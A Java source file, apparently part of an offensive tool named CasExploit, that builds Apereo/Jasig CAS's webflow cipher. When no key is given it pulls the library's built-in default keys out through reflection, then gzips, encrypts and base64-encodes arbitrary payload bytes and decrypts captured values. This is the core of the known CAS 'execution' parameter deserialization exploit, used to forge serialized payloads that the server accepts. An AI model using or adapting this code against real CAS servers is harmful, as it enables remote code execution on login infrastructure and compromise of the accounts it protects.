package com.newcodor.util;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPOutputStream;

import org.jasig.cas.CipherExecutor;
import org.jasig.cas.util.WebflowCipherExecutor;
import org.jasig.cas.web.flow.CasWebflowCipherBean;
import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
import org.cryptacular.EncodingException;
import org.cryptacular.bean.CipherBean;
import org.cryptacular.util.CodecUtil;

public class CasExploit {

//    private static EncryptedTranscoder getTranscoder(Map<String, String> key) throws IOException {
//        EncryptedTranscoder transcoder;
//        if (key == null) {
//            transcoder = new EncryptedTranscoder();
//        } else {
//            CipherExecutor cipherExecutor = new WebflowCipherExecutor(key.get(Const.SecretKeyEncryption), key.get(Const.SecretKeySigning), key.get(Const.SecretKeyAl));
//            CasWebflowCipherBean cipherBean = new CasWebflowCipherBean(cipherExecutor);
//            transcoder = new EncryptedTranscoder((CipherBean)cipherBean);
//        }
//        return transcoder;
//    }


    private static CipherBean getCipherBean(Map<String, String> key) throws IOException, NoSuchFieldException, IllegalAccessException {
        CipherBean cipherBean = null;
        if (key == null) {
            EncryptedTranscoder transcoder = new EncryptedTranscoder();
            Field cipherBeanField = transcoder.getClass().getDeclaredField("cipherBean");
            cipherBeanField.setAccessible(true);
            cipherBean = (CipherBean) cipherBeanField.get(transcoder);
        } else {
            CipherExecutor cipherExecutor = new WebflowCipherExecutor(key.get(Const.SecretKeyEncryption), key.get(Const.SecretKeySigning), key.get(Const.SecretKeyAl));
            cipherBean = (CipherBean) new CasWebflowCipherBean(cipherExecutor);
        }
        return cipherBean;
    }


    public static  String encode(byte[] inputBytes,Map<String, String> key) throws IOException {
        CipherBean cipherBean = null;
        byte[] result = new byte[0];
        try {
            cipherBean = getCipherBean(key);
            System.out.println("[+] gzip compress original .....");
            ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(outBuffer);
            gzip.write(inputBytes,0,inputBytes.length);
            gzip.close();
            outBuffer.close();
            result =cipherBean.encrypt(outBuffer.toByteArray());
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }finally {
            return  CodecUtil.b64(result);
        }
    }

    public static  byte[] decode(byte[] encodeBytes,Map<String, String> key) throws IOException {
            CipherBean cipherBean = null;
            byte[] result = new byte[0];
            try {
                cipherBean = getCipherBean(key);
                result = cipherBean.decrypt(encodeBytes);
                if(!new String(result).contains("java")){
                    System.out.println("[+] try gunzip uncompress result......");
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    GZIPInputStream gunzip = new GZIPInputStream(new ByteArrayInputStream(result));
                    byte[] buffer = new byte[256];
                    int n;
                    while ((n=gunzip.read(buffer))>=0){
                        out.write(buffer, 0, n);
                    }
                    gunzip.close();
                    out.close();
                    result =out.toByteArray();
                }
            } catch (NoSuchFieldException e) {
                System.out.println("[-] NoSuchFieldException:No Field name with \""+e.getMessage()+"\"");
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                System.out.println("[-] Exception:"+e.getMessage());
                e.printStackTrace();
            }catch (EncodingException e){
                System.out.println("[-] EncodingException "+e.getMessage()+",continue the next key");
            }finally {
                return result;
            }
        }

}
